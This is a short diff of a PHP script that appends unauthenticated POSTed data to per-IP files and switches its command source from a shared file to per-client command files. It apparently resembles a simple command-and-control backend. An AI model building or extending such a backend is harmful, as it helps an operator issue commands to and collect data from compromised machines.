@@ -1,7 +1,7 @@
 <?php
 
 $file_out = 'data/' . $_SERVER['REMOTE_ADDR'];
-$file_in = 'commands.txt';
+$file_in = 'cmds/' . $_SERVER['REMOTE_ADDR'];
 
 file_put_contents($file_out, file_get_contents($file_out) . $_POST['d']);
 
